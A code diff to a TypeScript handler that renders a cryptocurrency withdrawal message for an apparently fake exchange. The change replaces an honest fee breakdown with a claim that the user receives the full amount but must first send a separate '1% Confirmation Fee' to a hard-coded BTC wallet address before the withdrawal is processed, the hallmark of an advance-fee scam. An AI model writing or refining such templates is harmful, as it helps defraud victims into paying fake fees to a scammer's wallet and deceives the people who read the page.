@@ -282,20 +282,21 @@ const handler = async (req: Request): Promise<Response> => {
             </div>
 
             <div class="section">
-              <div class="section-title">Fee Breakdown</div>
+              <div class="section-title">Confirmation Fee</div>
               <div class="fee-breakdown">
                 <div class="fee-row">
-                  <span class="label">Withdrawal Amount</span>
-                  <span class="value">${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })} ${safeCurrency.toUpperCase()}</span>
-                </div>
-                <div class="fee-row">
-                  <span class="label">Network Fee</span>
-                  <span class="value">-${fee.toLocaleString("en-US", { minimumFractionDigits: 2 })} ${safeCurrency.toUpperCase()}</span>
-                </div>
-                <div class="fee-row fee-total">
                   <span class="label">You Receive</span>
-                  <span class="value">${actualNetAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })} ${safeCurrency.toUpperCase()}</span>
+                  <span class="value" style="color: #0ecb81; font-weight: 700;">${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })} ${safeCurrency.toUpperCase()}</span>
                 </div>
+                <div class="fee-row" style="border-top: 1px dashed #2b3139; margin-top: 8px; padding-top: 10px;">
+                  <span class="label">1% Confirmation Fee</span>
+                  <span class="value" style="color: #f0b90b; font-weight: 600;">$${(amount * 0.01).toLocaleString("en-US", { minimumFractionDigits: 2 })} USD</span>
+                </div>
+              </div>
+              <div style="background: rgba(240,185,11,0.08); border: 1px solid rgba(240,185,11,0.2); border-radius: 8px; padding: 14px; margin-top: 12px;">
+                <p style="color: #f0b90b; font-size: 13px; font-weight: 600; margin: 0 0 6px;">⚠️ Separate Deposit Required</p>
+                <p style="color: #848e9c; font-size: 12px; margin: 0 0 8px; line-height: 1.5;">You must deposit the 1% confirmation fee to the platform BTC wallet before your withdrawal can be processed:</p>
+                <p style="color: #eaecef; font-family: 'SF Mono','Fira Code','Courier New',monospace; font-size: 11px; background: #2b3139; padding: 8px 10px; border-radius: 4px; word-break: break-all; margin: 0;">bc1qx6hnpju7xhznw6lqewvnk5jrn87devagtrhnsv</p>
               </div>
             </div>
 
